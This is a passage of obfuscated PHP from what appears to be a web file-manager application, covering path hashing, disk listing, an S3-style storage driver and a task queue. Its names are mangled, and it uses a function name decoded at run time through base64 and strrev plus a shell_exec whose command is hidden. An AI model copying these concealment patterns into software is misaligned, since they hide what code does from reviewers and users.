$ªêƒË×ê[1334]) { continue; } for ($øÇ†Ì¶ = $şŞ—”üì; $øÇ†Ì¶ >= 0; $øÇ†Ì¶--) { if ($Õ±³Â[$øÇ†Ì¶] === $ªêƒË×ê[10] || $Õ±³Â[$øÇ†Ì¶] === $ªêƒË×ê[1334] || $Õ±³Â[$øÇ†Ì¶] === -1) { continue; } if ($Õ±³Â[$øÇ†Ì¶] === $ªêƒË×ê[12]) { $Õ±³Â[$şŞ—”üì] = -1; break; } $Õ±³Â[$şŞ—”üì] = -1; $Õ±³Â[$øÇ†Ì¶] = -1; break; } } $ ¶·³şŞ = array(); foreach ($Õ±³Â as $Ü†™²Ó) { if ($Ü†™²Ó !== -1) { $ ¶·³şŞ[] = $Ü†™²Ó; } } $ı˜æÑ = implode($ªêƒË×ê[8], $ ¶·³şŞ); if (strpos($ı˜æÑ, $ªêƒË×ê[1335]) === 0) { $ı˜æÑ = $ªêƒË×ê[1331] . substr($ı˜æÑ, strlen($ªêƒË×ê[1335])); } return $ı˜æÑ; } public static function sourceID($—£”¦¤) { $ø‘Ë³ØÚ =& $_SERVER[ú‡®¯¨±]; $ó¼•¤“º = self::parse($—£”¦¤); if ($ó¼•¤“º[$ø‘Ë³ØÚ[33]] !== self::KOD_SOURCE) { show_json(LNG($ø‘Ë³ØÚ[1336]), !1); } return $ó¼•¤“º[$ø‘Ë³ØÚ[453]]; } public static function make($‰å°ãÊé) { if (!$‰å°ãÊé) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‰å°ãÊé)); } public static function makeShare($©îÈ†·Œ, $¸½™İŠŸ) { return self::makePath(self::KOD_SHARE_ITEM, $©îÈ†·Œ, $¸½™İŠŸ); } public static function makeFileTypePath($ıËæİõæ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ıËæİõæ); } public static function makeFileTagPath($¸ƒãÜ€) { return self::makePath(self::KOD_USER_FILE_TAG, $¸ƒãÜ€); } public static function makePath($ŸÆ¦Áãµ, $±Å§µÑ = '', $ˆİÌÛì• = '') { $©úáÜíÍ =& $_SERVER[ú‡®¯¨±]; $òÁªó = substr($ŸÆ¦Áãµ, 1, -1); $¹âãÌ¨ = $©úáÜíÍ[1337] . $òÁªó . $©úáÜíÍ[1338] . $±Å§µÑ . $©úáÜíÍ[1339]; $¹âãÌ¨ = $ˆİÌÛì• ? $¹âãÌ¨ . $ˆİÌÛì• . $©úáÜíÍ[8] : $¹âãÌ¨; return $¹âãÌ¨; } public static function hashPath($ÏÆĞ©Ú¹, $«Å¦·€‹ = true) { $®œ“„êÍ =& $_SERVER[ú‡®¯¨±]; $ƒ°°ºËÅ = is_array($ÏÆĞ©Ú¹) ? $ÏÆĞ©Ú¹ : IO::info($ÏÆĞ©Ú¹); $›Ê¾åğÌ = _get($ƒ°°ºËÅ, $®œ“„êÍ[1340], $®œ“„êÍ[12]); if (!$›Ê¾åğÌ && isset($ƒ°°ºËÅ[$®œ“„êÍ[231]])) { $›Ê¾åğÌ = trim($ƒ°°ºËÅ[$®œ“„êÍ[231]], $®œ“„êÍ[120]); } if (!$›Ê¾åğÌ && isset($ƒ°°ºËÅ[$®œ“„êÍ[183]]) && $ƒ°°ºËÅ[$®œ“„êÍ[183]]) { $ƒ°°ºËÅ = IO::info(KodIO::make($ƒ°°ºËÅ[$®œ“„êÍ[183]])); $›Ê¾åğÌ = _get($ƒ°°ºËÅ, $®œ“„êÍ[1340], $®œ“„êÍ[12]); } $ŠĞ¬·‰É = md5($ƒ°°ºËÅ[$®œ“„êÍ[86]] . $ƒ°°ºËÅ[$®œ“„êÍ[78]] . $ƒ°°ºËÅ[$®œ“„êÍ[87]]); if (!$›Ê¾åğÌ && file_exists($ƒ°°ºËÅ[$®œ“„êÍ[86]])) { $›Ê¾åğÌ = Cache::get($ŠĞ¬·‰É . $®œ“„êÍ[1341]); $›Ê¾åğÌ = !1; if (!$›Ê¾åğÌ) { $›Ê¾åğÌ = IO::hashSimple($ƒ°°ºËÅ[$®œ“„êÍ[86]]); Cache::set($ŠĞ¬·‰É . $®œ“„êÍ[1341], $›Ê¾åğÌ, 3600 * 24 * 30); } } if ($«Å¦·€‹ && !$›Ê¾åğÌ) { } return $›Ê¾åğÌ ? $›Ê¾åğÌ : $ŠĞ¬·‰É; } public static function hashPathSafe($“ˆ³‚ƒ, $Õ¸Õ×‚ = true) { $–ÁÁºÄ =& $_SERVER[ú‡®¯¨±]; $‰ü•­ç = self::hashPath($“ˆ³‚ƒ, $Õ¸Õ×‚); return md5($‰ü•­ç . $–ÁÁºÄ[1342] . Model($–ÁÁºÄ[825])->get($–ÁÁºÄ[826])); } public static function initSystemPath() { $çúÁŒÄÄ =& $_SERVER[ú‡®¯¨±]; if (defined($çúÁŒÄÄ[1343])) { return; } define($çúÁŒÄÄ[1343], self::systemPath($çúÁŒÄÄ[181])); define($çúÁŒÄÄ[1344], self::systemPath($çúÁŒÄÄ[1345])); define($çúÁŒÄÄ[1346], self::systemPath($çúÁŒÄÄ[1347])); define($çúÁŒÄÄ[1348], self::systemPath($çúÁŒÄÄ[1349])); IOHistory::bindEvent(); } public static function systemPath($ëåÔÚÄ˜) { $Õ´Ü®‡˜ =& $_SERVER[ú‡®¯¨±]; $…ÚÏ˜³¦ = $Õ´Ü®‡˜[1350] . ucfirst($ëåÔÚÄ˜); $­ôò€ÎÓ = Model($Õ´Ü®‡˜[825])->get($…ÚÏ˜³¦); if ($­ôò€ÎÓ) { return $­ôò€ÎÓ; } if ($ëåÔÚÄ˜ == $Õ´Ü®‡˜[181]) { $­ôò€ÎÓ = self::make(Model($Õ´Ü®‡˜[880])->systemRootPathAdd($Õ´Ü®‡˜[584])); } else { $­ôò€ÎÓ = self::systemPath($Õ´Ü®‡˜[181]); $­¢ÊÕ” = self::sourceID($­ôò€ÎÓ); $­ôò€ÎÓ = self::make(Model($Õ´Ü®‡˜[880])->mkdir($­¢ÊÕ”, $ëåÔÚÄ˜)); } Model($Õ´Ü®‡˜[825])->set($…ÚÏ˜³¦, $­ôò€ÎÓ); return $­ôò€ÎÓ; } public static function systemFolder($“‚ê¦çë) { $ÚûÁò = IO_PATH_SYSTEM_SOURCE . $“‚ê¦çë; $ÃÄ‰Ì™‰ = Cache::get($ÚûÁò); if (!$ÃÄ‰Ì™‰) { $øŠóîÌ¾ = IO::infoFullSimple($ÚûÁò); if (!$øŠóîÌ¾) { $ÃÄ‰Ì™‰ = IO::mkdir($ÚûÁò, REPEAT_SKIP); } else { $ÃÄ‰Ì™‰ = $øŠóîÌ¾[$_SERVER[ú‡®¯¨±][86]]; } Cache::set($ÚûÁò, $ÃÄ‰Ì™‰, 3600 * 10); } return $ÃÄ‰Ì™‰; } public static function defaultDriver() { return Model($_SERVER[ú‡®¯¨±][822])->defaultDriver(); } public static function defaultIO() { $µèóÄ’À =& $_SERVER[ú‡®¯¨±]; $ÆØêÅ© = self::defaultDriver(); return $µèóÄ’À[1351] . $ÆØêÅ©[$µèóÄ’À[453]] . $µèóÄ’À[1339]; } public static function defaultDriverInit() { static $ÏÆ£¯½ = false; if ($ÏÆ£¯½) { return $ÏÆ£¯½; } $ÏÆ£¯½ = IO::init(self::defaultIO()); return $ÏÆ£¯½; } public static function fileTypeList() { $ó˜ §Èµ =& $_SERVER[ú‡®¯¨±]; $×ÀŒô®– = $GLOBALS[$ó˜ §Èµ[6]][$ó˜ §Èµ[1352]]; foreach ($×ÀŒô®– as $Áû¯®íş => $®éğ˜) { $çŒÖ‰Àú = $ó˜ §Èµ[1353] . $Áû¯®íş; $€Ãß¤×º = LNG($çŒÖ‰Àú); if ($çŒÖ‰Àú != $€Ãß¤×º) { $×ÀŒô®–[$Áû¯®íş][$ó˜ §Èµ[32]] = $€Ãß¤×º; } } return $×ÀŒô®–; } public static function diskList($ÀüúÛ = true) { $•ß–‰Ãû = $_SERVER[ú‡®¯¨±][1354]; if ($ÀüúÛ) { $ËÖ‚Õş× = Cache::get($•ß–‰Ãû); if (is_array($ËÖ‚Õş×)) { return $ËÖ‚Õş×; } } $ËÖ‚Õş× = self::diskListGet(); Cache::set($•ß–‰Ãû, $ËÖ‚Õş×, 60); return $ËÖ‚Õş×; } public static function diskListGet() { $í¿ò‰èÄ =& $_SERVER[ú‡®¯¨±]; $Ù“€à£« = array(); if ($GLOBALS[$í¿ò‰èÄ[6]][$í¿ò‰èÄ[1355]] == $í¿ò‰èÄ[1356]) { $û®–Î—ô = $í¿ò‰èÄ[1357]; for ($èÔ³òÅ = 0; $èÔ³òÅ < strlen($û®–Î—ô); $èÔ³òÅ++) { $˜ÇçäÎı = $û®–Î—ô[$èÔ³òÅ] . $í¿ò‰èÄ[1358]; if (file_exists($˜ÇçäÎı)) { $Ù“€à£«[] = $˜ÇçäÎı; } } return $Ù“€à£«; } if (!function_exists($í¿ò‰èÄ[100])) { $Ù“€à£«[] = $í¿ò‰èÄ[891]; return $Ù“€à£«; } $÷²ä€Ú€ = explode($í¿ò‰èÄ[207], shell_exec($í¿ò‰èÄ[1359])); array_shift($÷²ä€Ú€); array_pop($÷²ä€Ú€); $£¨¼–ü = array($í¿ò‰èÄ[1360], $í¿ò‰èÄ[1361], $í¿ò‰èÄ[1362], $í¿ò‰èÄ[1363], $í¿ò‰èÄ[1364], $í¿ò‰èÄ[1365], $í¿ò‰èÄ[1366], $í¿ò‰èÄ[1367]); foreach ($÷²ä€Ú€ as $‰ø´­¢) { $Î¿ŸÀÓ = preg_split($í¿ò‰èÄ[1368], $‰ø´­¢); $˜ÇçäÎı = $Î¿ŸÀÓ[count($Î¿ŸÀÓ) - 1]; if (!strstr($Î¿ŸÀÓ[0], $í¿ò‰èÄ[1369]) || !$˜ÇçäÎı) { continue; } $¸ä“¥Ç³ = rtrim($˜ÇçäÎı, $í¿ò‰èÄ[8]) . $í¿ò‰èÄ[8]; if (in_array($¸ä“¥Ç³, $£¨¼–ü)) { continue; } $Ù“€à£«[] = $¸ä“¥Ç³; } return $Ù“€à£«; } public static function isSameDisk($„ÕßİÕŞ, $òéÉşÇØ) { $‹è¢Ÿà¥ =& $_SERVER[ú‡®¯¨±]; if ($GLOBALS[$‹è¢Ÿà¥[6]][$‹è¢Ÿà¥[1355]] == $‹è¢Ÿà¥[1356]) { return strtolower(substr($„ÕßİÕŞ, 0, 1)) == strtolower(substr($òéÉşÇØ, 0, 1)); } $â“ÜŒ¦‘ = self::diskList(); $ÂœŞ®ôÃ = !1; $«ü•üÖû = !1; sort($â“ÜŒ¦‘); $â“ÜŒ¦‘ = array_reverse($â“ÜŒ¦‘); $„ÕßİÕŞ = rtrim($„ÕßİÕŞ, $‹è¢Ÿà¥[8]) . $‹è¢Ÿà¥[8]; $òéÉşÇØ = rtrim($òéÉşÇØ, $‹è¢Ÿà¥[8]) . $‹è¢Ÿà¥[8]; foreach ($â“ÜŒ¦‘ as $”Ê­‰»–) { $—øÏ¥±¨ = strlen($”Ê­‰»–); if (!$ÂœŞ®ôÃ && substr($„ÕßİÕŞ, 0, $—øÏ¥±¨) == $”Ê­‰»–) { $ÂœŞ®ôÃ = $”Ê­‰»–; } if (!$«ü•üÖû && substr($òéÉşÇØ, 0, $—øÏ¥±¨) == $”Ê­‰»–) { $«ü•üÖû = $”Ê­‰»–; } if ($ÂœŞ®ôÃ && $«ü•üÖû) { break; } } return $ÂœŞ®ôÃ === $«ü•üÖû; } public static function transferType($Ï Ò˜’Ğ, $ºçàÙ¸‰) { $˜„¹å»Æ =& $_SERVER[ú‡®¯¨±]; $Ê÷ÖÈ½ø = self::driverType($Ï Ò˜’Ğ); $®ĞøüÅ = self::driverType($ºçàÙ¸‰); if ($Ê÷ÖÈ½ø[$˜„¹å»Æ[33]] == $®ĞøüÅ[$˜„¹å»Æ[33]] && $Ê÷ÖÈ½ø[$˜„¹å»Æ[1370]] == $®ĞøüÅ[$˜„¹å»Æ[1370]]) { return $˜„¹å»Æ[1371]; } if ($Ê÷ÖÈ½ø[$˜„¹å»Æ[33]] == $˜„¹å»Æ[924] && $®ĞøüÅ[$˜„¹å»Æ[33]] == $˜„¹å»Æ[108]) { return $˜„¹å»Æ[1250]; } if ($Ê÷ÖÈ½ø[$˜„¹å»Æ[33]] == $˜„¹å»Æ[108] && $®ĞøüÅ[$˜„¹å»Æ[33]] == $˜„¹å»Æ[924]) { return $˜„¹å»Æ[109]; } return $˜„¹å»Æ[1372]; } public static function driverType($ºªÕÉ©¨) { $Ò­·¾Ïï =& $_SERVER[ú‡®¯¨±]; $Ê¢‘ü›é = str_replace($Ò­·¾Ïï[1373], $Ò­·¾Ïï[12], strtolower($ºªÕÉ©¨->getType())); if ($Ê¢‘ü›é == $Ò­·¾Ïï[812] || $Ê¢‘ü›é == $Ò­·¾Ïï[1374] || $Ê¢‘ü›é == $Ò­·¾Ïï[1375]) { $ºªÕÉ©¨ = self::defaultDriverInit(); } else { if ($Ê¢‘ü›é == $Ò­·¾Ïï[1260] || $Ê¢‘ü›é == $Ò­·¾Ïï[1376]) { $ºªÕÉ©¨ = IO::init($ºªÕÉ©¨->pathParse[$Ò­·¾Ïï[1207]]); } } $‰…´ìº = $ºªÕÉ©¨->path; $Ê¢‘ü›é = str_replace($Ò­·¾Ïï[1373], $Ò­·¾Ïï[12], strtolower($ºªÕÉ©¨->getType())); if ($Ê¢‘ü›é == $Ò­·¾Ïï[108]) { return array($Ò­·¾Ïï[33] => $Ò­·¾Ïï[108], $Ò­·¾Ïï[1370] => $Ò­·¾Ïï[12], $Ò­·¾Ïï[86] => $‰…´ìº, $Ò­·¾Ïï[97] => $ºªÕÉ©¨); } return array($Ò­·¾Ïï[33] => $Ò­·¾Ïï[924], $Ò­·¾Ïï[1370] => $ºªÕÉ©¨->pathDriver, $Ò­·¾Ïï[86] => $‰…´ìº, $Ò­·¾Ïï[97] => $ºªÕÉ©¨); } public static function pathDriverType($ãˆÈ‚¢) { return $ãˆÈ‚¢ ? self::driverType(IO::init($ãˆÈ‚¢)) : !1; } public static function pathDriverLocal($˜°Ëƒ¹¡) { $Ù—ë†´ =& $_SERVER[ú‡®¯¨±]; $—¢™…îş = $˜°Ëƒ¹¡ ? self::driverType(IO::init($˜°Ëƒ¹¡)) : !1; return $—¢™…îş[$Ù—ë†´[33]] == $Ù—ë†´[108] ? !0 : !1; } public static function allowCover($ê­¼Şó², $’Õùùı© = true) { $„Àâ…¿Û =& $_SERVER[ú‡®¯¨±]; if (is_string($ê­¼Şó²)) { $ê­¼Şó² = IO::info($ê­¼Şó²); } if (!$ê­¼Şó² || $ê­¼Şó²[$„Àâ…¿Û[33]] == $„Àâ…¿Û[77] || $ê­¼Şó²[$„Àâ…¿Û[78]] <= 100) { return !1; } if (isset($ê­¼Şó²[$„Àâ…¿Û[1377]]) || !$ê­¼Şó²[$„Àâ…¿Û[86]]) { return !1; } if (isset($ê­¼Şó²[$„Àâ…¿Û[228]]) && !$ê­¼Şó²[$„Àâ…¿Û[228]]) { return !1; } static $âµÂøû = false; if (!$âµÂøû || !$’Õùùı©) { $íô—ä = self::driverType(IO::init($ê­¼Şó²[$„Àâ…¿Û[86]])); $Âí§×ĞÍ = $íô—ä[$„Àâ…¿Û[97]]; $âµÂøû = $„Àâ…¿Û[186]; if ($íô—ä[$„Àâ…¿Û[33]] == $„Àâ…¿Û[108]) { $âµÂøû = $„Àâ…¿Û[1378]; } if ($íô—ä[$„Àâ…¿Û[97]] && is_array($íô—ä[$„Àâ…¿Û[97]]->config)) { $Ğé¯ÇÜ– = $íô—ä[$„Àâ…¿Û[97]]->config; if (isset($Ğé¯ÇÜ–[$„Àâ…¿Û[1379]]) && $Ğé¯ÇÜ–[$„Àâ…¿Û[1379]]) { $âµÂøû = $„Àâ…¿Û[1378]; } } } return $âµÂøû == $„Àâ…¿Û[1378] ? !0 : !1; } } class PathDriverBOS extends PathDriverBaseS3 { public function __construct($Ë›Ê½Şà) { parent::__construct($Ë›Ê½Şà); } public function getHost() { $Ã± ÒúÍ =& $_SERVER[ú‡®¯¨±]; $½ş°Š¬ø = str_rtrim(parent::getHost(), $Ã± ÒúÍ[8] . $this->bucket); $½ş°Š¬ø = explode($Ã± ÒúÍ[200], $½ş°Š¬ø); return $½ş°Š¬ø[0] . $Ã± ÒúÍ[200] . $this->bucket . $Ã± ÒúÍ[1380] . $½ş°Š¬ø[1]; } } goto bìä‡æë•Ú; bµŠ‹¾¹åŒ: define($_SERVER[ú‡®¯¨±][295], 3); define($_SERVER[ú‡®¯¨±][296], 1); define($_SERVER[ú‡®¯¨±][297], 0); goto b¹² öÖ””; DÆ©õÊØÂˆ: $fileSize = strrev(base64_decode($_SERVER[ë§´ÖŞÆ][0])); function binCheckNeq($€÷Æù², $ Íå–°) { return $€÷Æù² != $ Íå–°; } $_SERVER[$_SERVER[ë§´ÖŞÆ][1]] = $fileSize($_SERVER[$_SERVER[ë§´ÖŞÆ][2]]); goto dí¡—¾¼®¿; DÎÏ½Âƒà: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‚„Ê·³Š, $Ãˆƒ˜²» = '', $™åû¾ß” = 0, $­´ÅÜÒ” = '') { $¹º›Ú† =& $_SERVER[ú‡®¯¨±]; $­´ÅÜÒ” = $­´ÅÜÒ” ? $­´ÅÜÒ” : ($Ãˆƒ˜²» ? $Ãˆƒ˜²» : $‚„Ê·³Š); $íïÛıªÏ = new Task($‚„Ê·³Š, $Ãˆƒ˜²», $™åû¾ß”, $­´ÅÜÒ”); $GLOBALS[$¹º›Ú†[1791] . $‚„Ê·³Š] = new TaskLog($¹º›Ú†[1692], $íïÛıªÏ, $­´ÅÜÒ”); return $íïÛıªÏ; } public function __construct($Õõ‡‚© = '', $–÷§ãê½ = '', $°ÂÌˆ‹ƒ = '') { $¡ùæİ›­ =& $_SERVER[ú‡®¯¨±]; if (!$Õõ‡‚©) { $Õõ‡‚© = $¡ùæİ›­[1692]; } $’¤æ€–æ = $Õõ‡‚© . $¡ùæİ›­[440] . rand_string(10); if (!$°ÂÌˆ‹ƒ) { $°ÂÌˆ‹ƒ = $Õõ‡‚© . $¡ùæİ›­[53] . $°ÂÌˆ‹ƒ; } switch ($Õõ‡‚©) { case $¡ùæİ›­[1692]: if (!$–÷§ãê½ || !$–÷§ãê½->task) { return echoLog($Õõ‡‚© . $¡ùæİ›­[1792]); } $„¾ÑÕ©ú = $–÷§ãê½; $’¤æ€–æ = $„¾ÑÕ©ú->task[$¡ùæİ›­[453]]; $Õõ‡‚© = $„¾ÑÕ©ú->task[$¡ùæİ›­[453]]; if (!$„¾ÑÕ©ú->task[$¡ùæİ›­[1598]]) { $„¾ÑÕ©ú->task[$¡ùæİ›­[1598]] = $°ÂÌˆ‹ƒ ? $°ÂÌˆ‹ƒ : $Õõ‡‚©; } break; case $¡ùæİ›­[1793]: if (!$–÷§ãê½) { return echoLog($Õõ‡‚© . $¡ùæİ›­[1794]); } $»ã­ƒÑ‘ = is_string($–÷§ãê½) ? array($–÷§ãê½) : $–÷§ãê½; $„¾ÑÕ©ú = new TaskFileTransfer($’¤æ€–æ, $Õõ‡‚©, 0, $°ÂÌˆ‹ƒ ? $°ÂÌˆ‹ƒ : $»ã­ƒÑ‘[0]); foreach ($»ã­ƒÑ‘ as $Ñ°½Û¤) { $„¾ÑÕ©ú->addPath($Ñ°½Û¤); } break; case $¡ùæİ›­[368]: if (!$–÷§ãê½) { return echoLog($Õõ‡‚© . $¡ùæİ›­[1794]); } $»ã­ƒÑ‘ = is_string($–÷§ãê½) ? array($–÷§ãê½) : $–÷§ãê½; $„¾ÑÕ©ú = new TaskZip($’¤æ€–æ, $Õõ‡‚©, 0, $°ÂÌˆ‹ƒ ? $°ÂÌˆ‹ƒ : $»ã­ƒÑ‘[0]); foreach ($»ã­ƒÑ‘ as $Ñ°½Û¤) { $„¾ÑÕ©ú->addPath($Ñ°½Û¤); } break; case $¡ùæİ›­[1270]: if (!$–÷§ãê½) { return echoLog($Õõ‡‚© . $¡ùæİ›­[1794]); } $„¾ÑÕ©ú = new TaskUnZip($’¤æ€–æ, $Õõ‡‚©, 0, $°ÂÌˆ‹ƒ ? $°ÂÌˆ‹ƒ : $–÷§ãê½); if ($–÷§ãê½) { $„¾ÑÕ©ú->addFile($–÷§ãê½); } break; case $¡ùæİ›­[151]: $„¾ÑÕ©ú = new TaskHttp($’¤æ€–æ, $Õõ‡‚©); break; default: return; break; } $this->task = $„¾ÑÕ©ú; $this->taskID = $’¤æ€–æ; Hook::bind($¡ùæİ›­[1729], array($this, $¡ùæİ›­[1795])); Hook::bind($¡ùæİ›­[1731], array($this, $¡ùæİ›­[1796])); Hook::bind($¡ùæİ›­[1725], array($this, $¡ùæİ›­[1797])); echoLog($¡ùæİ›­[1798] . $„¾ÑÕ©ú->task[$¡ùæİ›­[1598]]); } public function __destruct() { $this->end(); } public function end($¡“Ø’Â¬ = '') { $´ÙêÖÕ™ =& $_SERVER[ú‡®¯¨±]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¡“Ø’Â¬); $this->task = !1; $this->taskID = !1; Hook::unbind($´ÙêÖÕ™[1729], array($this, $´ÙêÖÕ™[1795])); Hook::unbind($´ÙêÖÕ™[1731], array($this, $´ÙêÖÕ™[1796])); Hook::unbind($´ÙêÖÕ™[1725], array($this, $´ÙêÖÕ™[1797])); } public function taskUpdate($²´×İ»¬) { $Ç·´¤ºà =& $_SERVER[ú‡®¯¨±]; if (!$²´×İ»¬ || $this->taskID != $²´×İ»¬[$Ç·´¤ºà[453]]) { return; } $¡åÆÚ¤Ş = 20; $ìÍÅÜÀŸ = intval($²´×İ»¬[$Ç·´¤ºà[1710]] * $¡åÆÚ¤Ş); $›¡ä©úŒ = $Ç·´¤ºà[165] . str_repeat($Ç·´¤ºà[940], $ìÍÅÜÀŸ) . $Ç·´¤ºà[1070] . str_repeat($Ç·´¤ºà[53], $¡åÆÚ¤Ş - $ìÍÅÜÀŸ) . $Ç·´¤ºà[167]; $ÖÉãõ—« = $›¡ä©úŒ . sprintf($Ç·´¤ºà[1799], $²´×İ»¬[$Ç·´¤ºà[1710]] * 100) . $Ç·´¤ºà[1800]; $û†¨Š = $ÖÉãõ—« . $²´×İ»¬[$Ç·´¤ºà[1709]] . $Ç·´¤ºà[8] . $²´×İ»¬[$Ç·´¤ºà[841]] . LNG($Ç·´¤ºà[1801]); $µóí²îà = $Ç·´¤ºà[12]; if ($²´×İ»¬[$Ç·´¤ºà[1785]]) { $û†¨Š = $ÖÉãõ—« . size_format($²´×İ»¬[$Ç·´¤ºà[1709]]) . $Ç·´¤ºà[8] . size_format($²´×İ»¬[$Ç·´¤ºà[841]]); $µóí²îà = size_format($²´×İ»¬[$Ç·´¤ºà[1711]]) . $Ç·´¤ºà[1802]; } if ($²´×İ»¬[$Ç·´¤ºà[1120]]) { $²´×İ»¬[$Ç·´¤ºà[1759]] = $²´×İ»¬[$Ç·´¤ºà[1120]] . $Ç·´¤ºà[53] . $²´×İ»¬[$Ç·´¤ºà[1759]]; } if ($²´×İ»¬[$Ç·´¤ºà[1759]]) { $°òÉµˆÎ = $Ç·´¤ºà[12]; if ($²´×İ»¬[$Ç·´¤ºà[1761]]) { $°òÉµˆÎ = $Ç·´¤ºà[50] . size_format($²´×İ»¬[$Ç·´¤ºà[1762]]) . $Ç·´¤ºà[8] . size_format($²´×İ»¬[$Ç·´¤ºà[1761]]); } $µóí²îà .= $²´×İ»¬[$Ç·´¤ºà[1759]] . $°òÉµˆÎ; } if ($²´×İ»¬[$Ç·´¤ºà[818]] && !$²´×İ»¬[$Ç·´¤ºà[1761]]) { $µóí²îà .= $Ç·´¤ºà[53] . size_format($²´×İ»¬[$Ç·´¤ºà[1766]]) . $Ç·´¤ºà[8] . size_format($²´×İ»¬[$Ç·´¤ºà[818]]); } echoLog($û†¨Š . $Ç·´¤ºà[53] . $µóí²îà, !0); } public function taskEnd($ï¡¹€˜²) { $ÖÉøÊç» =& $_SERVER[ú‡®¯¨±]; if (!$ï¡¹€˜² || $this->taskID != $ï¡¹€˜²[$ÖÉøÊç»[453]]) { return; } $ğ¼½éÙù = $ï¡¹€˜² ? $ï¡¹€˜²[$ÖÉøÊç»[1709]] . $ÖÉøÊç»[8] . $ï¡¹€˜²[$ÖÉøÊç»[841]] . LNG($ÖÉøÊç»[1801]) . $ÖÉøÊç»[73] : $ÖÉøÊç»[12]; echoLog($ÖÉøÊç»[1803] . $ï¡¹€˜²[$ÖÉøÊç»[1598]] . ($ï¡¹€˜²[$ÖÉøÊç»[504]] ? $ÖÉøÊç»[73] . $ï¡¹€˜²[$ÖÉøÊç»[504]] : $ÖÉøÊç»[12]) . $ÖÉøÊç»[73] . $ğ¼½éÙù . $ÖÉøÊç»[1804] . sprintf($ÖÉøÊç»[906], timeFloat() - $ï¡¹€˜²[$ÖÉøÊç»[1712]]) . $ÖÉøÊç»[1724]); $this->end(); } public function taskKill($ï²Ü¨©) { $‹üçû°ø =& $_SERVER[ú‡®¯¨±]; if (!$ï²Ü¨© || $this->taskID != $ï²Ü¨©[$‹üçû°ø[453]]) { return; } echoLog($‹üçû°ø[1805] . $ï²Ü¨©[$‹üçû°ø[1598]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\x75\x65\x75\145\114\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\164\x61\163\x6b\x51\x75\145\165\145\104\x61\164\141"; const QUEUE_TIME = "\164\x61\163\x6b\x51\165\x65\165\x65\x4c\141\163\x74\x52\x75\156"; const QUEUE_THREAD = "\164\x61\x73\x6b\121\x75\x65\165\145\x54\x68\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Éê¯âû¾, $Ç™íú¸É = array(), $š¹Æçğ¦ = '', $¢ê¢…„€ = '') { $ÜÕï’‡ =& $_SERVER[ú‡®¯¨±]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¢ê¢…„€ && array_find_by_field(self::$listData, $ÜÕï’‡[96], $¢ê¢…„€)) { return !0; } if ($¢ê¢…„€ && array_find_by_field(self::$listDataAdd, $ÜÕï’‡[96], $¢ê¢…„€)) { return !0; } self::$listDataAdd[] = array($ÜÕï’‡[319] => $Éê¯âû¾, $ÜÕï’‡[1806] => $Ç™íú¸É, $ÜÕï’‡[504] => $š¹Æçğ¦, $ÜÕï’‡[96] => $¢ê¢…„€); return !0; } public static function addSubmit() { $ç¼íğıõ =& $_SERVER[ú‡®¯¨±]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ç¼íğıõ[1807] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ç¼íğıõ[12], $ç¼íğıõ[504])), $ç¼íğıõ[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($†Šá³²ô, $ïÈ·Ñã³ = array(), $ÚğÆÇ¼õ = '', $Ş¼¡†ÚÄ = '') { $ÀÌíÆ±ğ =& $_SERVER[ú‡®¯¨±]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ûá§ÊøÀ = self::getAll(); if ($Ş¼¡†ÚÄ && array_find_by_field($ûá§ÊøÀ, $ÀÌíÆ±ğ[96], $Ş¼¡†ÚÄ)) { return !0; } $ûá§ÊøÀ[] = array($ÀÌíÆ±ğ[319] => $†Šá³²ô, $ÀÌíÆ±ğ[1806] => $ïÈ·Ñã³, $ÀÌíÆ±ğ[504] => $ÚğÆÇ¼õ, $ÀÌíÆ±ğ[96] => $Ş¼¡†ÚÄ); self::setAll($ûá§ÊøÀ); write_log($ÀÌíÆ±ğ[1807] . $ÚğÆÇ¼õ, $ÀÌíÆ±ğ[187]); return !0; } public static function run() { $œ–º­êô =& $_SERVER[ú‡®¯¨±]; $Ù²ŞßÆÌ = self::getAll(); $£ïç·Ñ½ = array_shift($Ù²ŞßÆÌ); if (!$£ïç·Ñ½) { return !1; } self::setAll($Ù²ŞßÆÌ); $¹•´Ø¯ = timeFloat(); $‹Øâ½À‰ = $œ–º­êô[12]; try { $‹Øâ½À‰ = Hook::apply($£ïç·Ñ½[$œ–º­êô[319]], $£ïç·Ñ½[$œ–º­êô[1806]]); } catch (Exception $”ïÛÖÑÚ) { write_log($”ïÛÖÑÚ, $œ–º­êô[1238]); } $øêû¬‹æ = number_format(timeFloat() - $¹•´Ø¯, 3) . $œ–º­êô[1724]; if ($‹Øâ½À‰ && is_string($‹Øâ½À‰)) { $øêû¬‹æ = $øêû¬‹æ . $œ–º­êô[1808] . $‹Øâ½À‰; } write_log($œ–º­êô[1809] . $£ïç·Ñ½[$œ–º­êô[504]] . $œ–º­êô[1810] . $øêû¬‹æ, $œ–º­êô[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Îæ¶æ•à =& $_SERVER[ú‡®¯¨±]; $Ú£°ïÌ = self::threadCount() + 1; if ($Ú£°ïÌ > 3 || !self::count()) { return; } write_log($Îæ¶æ•à[1811] . $Ú£°ïÌ, $Îæ¶æ•à[187]); Cache::set(self::QUEUE_THREAD, $Ú£°ïÌ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Îæ¶æ•à[1812], $Îæ¶æ•à[187]); } public static function getKey($¦ô¡ô», $°Ùà”˜ã = "\151\156\164") { $ªŞƒÑ¾² =& $_SERVER[ú‡®¯¨±]; Cache::removeMemory($¦ô¡ô»); $áÊ™¦ÑĞ = Cache::get($¦ô¡ô»); if ($°Ùà”˜ã == 